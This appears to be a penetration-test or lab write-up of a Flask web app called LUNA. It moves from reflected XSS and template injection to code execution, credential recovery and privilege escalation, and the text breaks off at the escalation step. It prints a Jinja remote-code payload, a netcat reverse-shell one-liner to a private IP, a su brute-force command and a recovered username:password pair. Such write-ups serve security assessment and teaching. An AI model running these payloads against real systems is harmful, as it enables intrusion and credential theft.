    1. Executive Summary
    
A comprehensive web application security assessment was performed against the LUNA application. The assessment identified multiple vulnerabilities including client-side injection, server-side template injection leading to remote code execution, credential exposure, weak credential storage, authentication weaknesses and privilege escalation paths.

    3. Vulnerability Details
    


    3.1 Reflected Cross Site Scripting
    
A Reflected Cross-Site Scripting (XSS) vulnerability was identified in the user input field of the application. The application reflected user supplied input in the response without proper validation or output encoding. As a result, malicious JavaScript code supplied by an attacker could be executed within the victim’s browser session.



    3.2 Server Side Template Injection
    
A Server-Side Template Injection (SSTI) vulnerability was identified in the input processing functionality of the application. User supplied input was evaluated by the backend template engine instead of being treated as plain text. The application processed template expressions directly and returned evaluated results to the response.



    3.3 Remote Code Execution via Template Injection
    
A Remote Code Execution (RCE) vulnerability was identified through exploitation of the previously discovered Server-Side Template Injection (SSTI) vulnerability. The backend template engine allowed execution of server-side expressions and access to application objects. By leveraging this behavior, arbitrary system commands were executed on the target server.



    3.4 Credential Exposure in Configuration File
    
A sensitive information exposure issue was identified during post-exploitation validation activities. The application configuration file contained plaintext database credentials and connection details that were accessible from the compromised environment. The configuration file stored sensitive information including database username, password, and connection parameters without implementing adequate protection mechanisms.



    3.5 Weak Password Storage Using Base64
    
A weakness was identified in the credential storage mechanism where user passwords were stored using Base64 encoding instead of secure cryptographic hashing techniques. Base64 is an encoding method designed for data representation and transmission purposes, it does not provide confidentiality, encryption, or one-way protection. Any encoded value can be easily decoded to retrieve the original password.



    3.6 Privilege Escalation via Docker Group
    
A privilege escalation vulnerability was identified due to improper assignment of user privileges. The compromised user account was a member of the Docker group, which allowed interaction with the Docker daemon. Membership in the Docker group effectively provides elevated privileges because users can create and execute privileged containers capable of interacting with the host operating system.


    


    4. Steps to Reproduce
    


    Step 1: Reconnaissance and Initial Enumeration
    

  • Performed port discovery using Nmap to identify exposed services.
    • 

  • Identified two open ports: 80 and 5000.
    • 


  • Both ports were ruining HTTP services.
    • 

  • Access to port 80 returned a restricted response and was inaccessible.
    • 


  • Continued the assessment against the service hosted on port 5000.
    • 



    Step 2: Input Testing
    

  • Accessed the web application interface.
    • 

  • Identified a user input field associated with the “Greet Me” functionality.
    • 

  • Submitted a normal text to understand application behavior.
    • 


  • Observed that the supplied input was reflected back within the response message.
    • 



    Step 3: Cross Site Scripting Testing
    

  • Submitted an XSS payload through the input field.
    • 


  • Observed successful execution of the payload.
    • 



    Step 4: Server Side Template Injection Testing
    

  • Performed server side validation using an SSTI payload.
    • 

  • Submitted the payload through the available input field.
    • 


  • Observed evaluation of the template expression.
    • 


  • Confirmed that the application was vulnerable to Server Side Template Injection (SSTI)
    • 


    Step 5: Template Engine Identification & RCE Testing
    

  • Used an error trigger payload to identify backend technologies.
    • 


  • Observed that the application was using Python Flask.
    • 


  • Submitted a Python based payload to verify code execution capability.
    • 

    → {{config.__class__.__init__.__globals__['id'].popen('ls').read()}}
    


  • Confirmed successful Remote Code Execution.
    • 


    Step 6: Reverse Shell Establishment
    

  • Selected an appropriate reverse shell payload from revshells.com.
    • 

    → busybox nc 192.168.1.39 6666 -e sh
    

  • Started a Netcat listener on the assessment machine.
    • 


  • Executed the payload through the vulnerable functionality.
    • 

  • Established a successful reverse shell connection.
    • 



    Step 7: Credential Discovery
    

  • Reviewed application files after obtaining access
    • 

  • Identified a configuration file.
    • 


  • The config file contains the credentials for accessing the MySQL database.
    • 


  • Used the recovered credentials to access the database and enumerate stored records and user information.
    • 



    Step 8: Weak Password Storing
    

  • Identified a password in the database that was encoded in Base64.
    • 

  • Decoded the value using CyberChef.
    • 


  • Used the recovered credential for authentication validation.
    • 



    Step 9: User Enumeration
    

  • Obtained use level access successfully.
    • 


  • Identified an text file containing multiple passwords.
    • 


  • Used Sudo_BruteForce to perform brute-force attacks and discovered passwords for other user accounts.

    → cd Sudo_BruteForce 
    → bash Linux-Su-Force.sh jose ../password.txt
    


    → Credential > jose:W1nter$2024
    

  • Successfully obtained access to another user account.
    • 

    → su jose
    



    Step 10: Privilege Escalation
    

  • Performed SUID enumeration and permission checks.
    • 


  • Didn’t identify exploitable SUID binaries.
    •

    •
